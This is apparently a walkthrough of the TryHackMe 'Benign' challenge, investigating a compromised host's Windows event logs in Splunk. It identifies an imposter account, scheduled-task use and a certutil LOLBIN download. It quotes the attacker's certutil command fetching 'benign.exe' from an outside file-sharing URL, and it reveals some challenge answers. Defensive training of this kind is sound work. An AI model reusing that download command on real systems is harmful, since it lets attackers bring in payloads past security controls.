```                                                                             
      _____        ______  _____   ______    ____       _____  _____   ______   
 ___|\     \   ___|\     \|\    \ |\     \  |    |  ___|\    \|\    \ |\     \  
|    |\     \ |     \     \\\    \| \     \ |    | /    /\    \\\    \| \     \ 
|    | |     ||     ,_____/|\|    \  \     ||    ||    |  |____|\|    \  \     |
|    | /_ _ / |     \--'\_|/ |     \  |    ||    ||    |    ____ |     \  |    |
|    |\    \  |     /___/|   |      \ |    ||    ||    |   |    ||      \ |    |
|    | |    | |     \____|\  |    |\ \|    ||    ||    |   |_,  ||    |\ \|    |
|____|/____/| |____ '     /| |____||\_____/||____||\ ___\___/  /||____||\_____/|
|    /     || |    /_____/ | |    |/ \|   |||    || |   /____ / ||    |/ \|   ||
|____|_____|/ |____|     | / |____|   |___|/|____| \|___|    | / |____|   |___|/
  \(    )/      \( |_____|/    \(       )/    \(     \( |____|/    \(       )/  
   '    '        '    )/        '       '      '      '   )/        '       '   
                      '                                   '
```
In this challenge room, we want to investigate compromised host-centric logs with Splunk.
[^1]

How many logs are ingested from the month of March, 2022?
-----------------------------------------------------------------------------------------
Following the task description, we already know to filter for the `win_event_log` in the
*Splunk* search bar for all time. This way, we are able to see a timeline of events from
March 4th to March 8th, 2022.

What is the name of the imposter account that is observed in the logs?
-----------------------------------------------------------------------------------------
From the previous `win_event_log` search, we want to find out the *UserName* values and
see that there are *11* unique names, even though we are aware of only nine user accounts
for the three departments. So, we proceed to view all the unique names with the filter
`win_event_log | top limit=20 UserName` which results in *SYSTEM*, *Moin*, *James*,
*Katrina*, *haroon*, *Chris.fort*, *deepak*, *Daina*, *Bell*, *Amelia* and *Amel1a*.
Since we already know the user names from the task description, we can assume that the
marketing department has one username double, one of which is the imposter account.

Which user from the HR department has been running scheduled tasks?
-----------------------------------------------------------------------------------------
For that, we can either investigate the three user accounts *haroon*, *Chris.fort* and
*Daina* or search for scheduled tasks and then investigate the user accounts.
In our case, we investigate the most common process names and a *schtasks* instance,
which stands for scheduled task. [^2] So, we can filter for it with
`win_event_log ProcessName="C:\\Windows\\System32\\schtasks.exe"` and thus are left with
87 events, by four user accounts. Since, we already know the HR department users, we
find out that only one user performed scheduled tasks this way.

Which user from the HR department executed a system process (LOLBIN) to download a 
payload from a file-sharing host?
-----------------------------------------------------------------------------------------
In order to find this *living off land binary* (LOLBIN) we first filter for the most
rarest command line arguments with `win_event_log | rare limit=20 CommandLine`. This
results in a suspicious *certutil* program, which is commonly used for file
downloading. [^3] So, it makes sense that we want to filter for it, in order to find out
the user account with the syntax.
```
win_event_log CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"
```
And indeed, the user who executed this command is from the HR department.

To bypass the security controls, which system process was used to download a payload from
the internet? 
-----------------------------------------------------------------------------------------
The system process that we want to provide here was already found in the *LOLBAS* [^3]
entry from the previous task.

What was the date that this binary was executed by the infected host?
-----------------------------------------------------------------------------------------
Again, from the previous tasks we already know that the binary that was executed by the
infected HR user acoount is called `benign.exe` and by checking the event time, when it
was downloaded from the file-sharing server, we also know the date when it was executed.

Which third-party site was accessed to download the malicious payload?
-----------------------------------------------------------------------------------------
The name of this site was already found in the previous tasks.

What is the name of the file that was saved on the host machine from the C2 server during
the post-exploitation phase?
-----------------------------------------------------------------------------------------
The name of this file was already found in the previous tasks.

The suspicious file downloaded from the C2 server contained malicious content with the
pattern `THM{...};`. What is that pattern?
-----------------------------------------------------------------------------------------
For that, we simply copy the C2 server URL from the previous task in our attacking 
virtual box and thus discover the flag.

What is the URL that the infected host connected to?
-----------------------------------------------------------------------------------------
The URL from the previous task can be provided here as well.

[^1]: https://tryhackme.com/room/benign
[^2]: https://research.splunk.com/stories/scheduled_tasks/#data-sources
[^3]: https://lolbas-project.github.io/lolbas/Binaries/Certutil/
